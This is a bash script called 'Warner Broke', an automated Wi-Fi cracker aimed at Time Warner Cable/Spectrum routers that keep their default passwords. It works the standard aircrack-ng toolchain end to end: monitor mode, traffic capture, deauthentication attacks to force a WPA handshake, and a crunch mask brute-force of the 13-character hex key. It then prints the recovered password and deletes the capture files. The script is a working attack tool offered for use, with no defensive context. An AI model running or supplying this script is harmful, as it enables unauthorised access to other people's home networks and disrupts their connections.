# !/bin/bash

#             Warner Broke
#
# An autocracker for Time Warner Cable(now Spectrum) routers with default password installed.
#
# CONFIG

SERVICE_STOP="service network-manager stop"
SERVICE_START="service network-manager start"

# END CONFIG

clear
read -p "Enter to begin..."

# KILLING SERVICES
echo "killing services..."
sleep 2
$SERVICE_STOP
airmon-ng check kill
clear

ifconfig
read -p "Enter wireless interface (wlan#): " INT
sleep 2 

# CONFIG2

MON=${INT}mon
MONITOR_ON="airmon-ng start $INT"
MONITOR_OFF="airmon-ng stop $INT"

# END CONFIG2

# STARTING MONITOR
echo "starting monitor mode..."
sleep 1
$MONITOR_ON  # STARTING MONITOR
clear

# DUMP NETWORK TRAFFIC
echo "dumping traffic... CTRL + C when done"
sleep 1
airodump-ng $MON

read -p "Enter ESSID: " ESSID
read -p "Enter CHANNEL: " CHANNEL
read -p "Enter wordlist: " WORDLIST

# START NETWORK SNIFF
SNIFF="airodump-ng --essid $ESSID --write $ESSID --channel $CHANNEL $MON"

echo "starting capture..."
sleep 1
xterm -e "$SNIFF" &

# CONFIG3

CAP=$ESSID-01.cap
HANDSHAKE="aireplay-ng -0 4 -e $ESSID $MON"
CRUNCH="crunch 13 13 0987654321ABCDEF -t $WORDLIST | aircrack-ng -a 2 -w- -e $ESSID $CAP"

## END CONFIG3

echo "beginning handshake capture..."
sleep 2
while true; do
if aircrack-ng $CAP | grep -q "1 handshake";
then
$CRUNCH > $ESSID; break
else
echo "capturing another handshake..."
sleep 1
xterm -e $HANDSHAKE 
echo "waiting for a  handshake..."
sleep 11
fi
done
clear

echo "Password cracked! Password will be displayed in a few moments..."
sleep 2
clear
echo "cleaning up and enabling services..."
$MONITOR_OFF
echo "..."
sleep 1
echo "..."
$SERVICE_START
rm *.netxml
rm *.csv
sleep 1
cat $ESSID
